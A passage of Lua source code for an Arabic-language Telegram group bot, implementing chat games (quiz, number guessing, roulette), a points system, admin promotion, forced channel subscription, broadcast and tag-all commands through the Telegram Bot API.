DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum8'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','⌁︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','⌁︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','⌁︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','⌁︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','⌁︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','⌁︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','⌁︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','⌁︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','⌁︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','⌁︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','⌁︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','⌁︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','⌁︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','⌁︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','⌁︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','⌁︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','⌁︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','⌁︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','⌁︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','⌁︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','⌁︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','⌁︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','⌁︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','⌁︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','⌁︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','⌁︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','⌁︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','⌁︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','⌁︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
DavidTEAM = name..'\n⌁︙ارسل الجواب الصحيح فقط'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(David..'Abs:GameNum8'..msg.chat_id_) then
if not DevAbs:get(David..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(David..'Abs:GameNum8'..msg.chat_id_)
DavidTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md')
end
DevAbs:set(David..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if DevAbs:get(David.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Abs(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAbs:get(David.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(David.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:incrby(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAbs:get(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAbs:del(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(David.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAbs:get(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAbs:get(David..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevAbs:set(David.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAbs:setex(David.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text == 'روليت' then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs:del(David.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:del(David..'Abs:ListRolet'..msg.chat_id_)  
DevAbs:setex(David.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevAbs:get(David.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "⌁︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevAbs:set(David.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '⌁︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⌁︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevAbs:del(David.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevAbs:get(David.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevAbs:sismember(David..'Abs:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'⌁︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevAbs:sadd(David..'Abs:ListRolet'..msg.chat_id_,text)
local CountAdd = DevAbs:get(David.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevAbs:scard(David..'Abs:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevAbs:del(David.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:setex(David.."Abs:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."]\n⌁︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
if text == 'كت تويت' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
local DavidTEAM = {  "آخر مرة زرت مدينة الملاهي؟",  "آخر مرة أكلت أكلتك المفضّلة؟",  "الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل",  "آخر شيء ضاع منك؟","كلمة أخيرة لشاغل البال؟","طريقتك المعتادة في التخلّص من الطاقة السلبية؟","شهر من أشهر العام له ذكرى جميلة معك؟","كلمة غريبة من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟","‏- أبرز صفة حسنة في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمة لشخص غالي اشتقت إليه؟💕","آخر خبر سعيد، متى وصلك؟","أنا آسف على ....؟","أوصف نفسك بكلمة؟","صريح، مشتاق؟","‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭","‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚","شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.", }  
Dev_Abs(msg.chat_id_, msg.id_, 1, ''..DavidTEAM[math.random(#DavidTEAM)]..'' , 1, 'md')  
return false
end
end
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1,[[
⌁︙قائمة العاب المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لعبة التخمين ↫ خمن
⌁︙لعبة الامثله ↫ امثله
⌁︙لعبة العكس ↫ العكس
⌁︙لعبة الاسئله ↫ اسئله
⌁︙لعبة الروليت ↫ روليت
⌁︙لعبة الحزوره ↫ حزوره
⌁︙لعبة الترتيب ↫ ترتيب
⌁︙لعبة المعاني ↫ معاني
⌁︙لعبة التويت ↫ كت تويت
⌁︙لعبة المختلف ↫ المختلف
⌁︙لعبة السمايلات ↫ سمايلات
⌁︙لعبة المحيبس ↫ المحيبس
⌁︙لعبة الرياضيات ↫ رياضيات
⌁︙لعبة الانكليزيه ↫ انكليزيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/X7PX7)
]], 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevAbs0 = (DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAbs:incrby(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevAbs0)
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
DevAbs:del(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
DevAbs:del(David..'Abs:AbsConstructor:'..msg.chat_id_)
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevAbs:sadd(David..'Abs:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevAbs:sadd(David..'Abs:AbsConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا يوجد ادمنيه ليتم رفعهم\n⌁︙تم رفع منشئ المجموعه", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم رفع '..num..' من الادمنيه \n⌁︙تم رفع منشئ المجموعه', 1, 'md')
end
end,nil) 
end
if text == 'غادر' and SudoBot(msg) then
if DevAbs:get(David.."Abs:Left:Bot"..David) and not SecondSudo(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعه \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, David)
DevAbs:srem(David.."Abs:Groups",msg.chat_id_)
end
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevAbs:get(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(David..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgs(msguser)..'\n⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:setex(David..'DevAbs4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '⌁︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
if DevAbs:get(David..'DevAbs2') then
local DevCh = DevAbs:get(David..'DevAbs3')
send(msg.chat_id_, msg.id_,"⌁︙الاشتراك الاجباري مفعل \n⌁︙على القناة ↫ ["..DevCh.."]")
else
DevAbs:setex(David..'DevAbs4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"⌁︙لاتوجد قناة لتفعيل الاشتراك\n⌁︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(David..'DevAbs2') DevAbs:del(David..'DevAbs3')
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(David..'DevAbs2') DevAbs:del(David..'DevAbs3')
Dev_Abs(msg.chat_id_, msg.id_, 1,"⌁︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if DevAbs:get(David..'DevAbs3') then
local DevCh = DevAbs:get(David..'DevAbs3')
send(msg.chat_id_, msg.id_, "⌁︙قناة الاشتراك ↫ ["..DevCh.."]")
else
send(msg.chat_id_, msg.id_, "⌁︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function DavidTEAM(extra,result,success)
if DevAbs:get(David.."Abs:Send:Bot"..David) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevAbs:smembers(David.."Abs:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevAbs:smembers(David.."Abs:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n⌁︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),DavidTEAM)
end
end
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevAbs:set(David..'Abs:viewget'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
if text == "السورس" or text == "سورس" then 
local text =  [[
Welcome To Source
⌁︙David TEAM
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/X7PX7)

⌁︙[Exp Source](https://t.me/X6UX6)

⌁︙[Developer](https://t.me/BwWwZ)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Tws David](https://t.me/R6JBOT)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevAbs:get(David.."Abs:Kick:Me"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(David..'yes'..msg.sender_user_id_..'', 'delyes')
DevAbs:set(David..'no'..msg.sender_user_id_..'', 'delno')
local Text = '⌁︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbs:set(David.."Abs:Kick:Me"..msg.chat_id_, true)
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تعطيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbs:del(David.."Abs:Kick:Me"..msg.chat_id_)
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تفعيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "نزلني" and ChCheck(msg) then
if DevAbs:get(David.."Abs:Del:Me"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(David..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAbs:set(David..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = '⌁︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbs:set(David.."Abs:Del:Me"..msg.chat_id_, true)
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تعطيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbs:del(David.."Abs:Del:Me"..msg.chat_id_)
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تفعيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbs:get(David..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevAbs:get(David..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
function TagAll(dp1,dp2)
local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbs:get(David..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevAbs:get(David..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevAbs:get(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
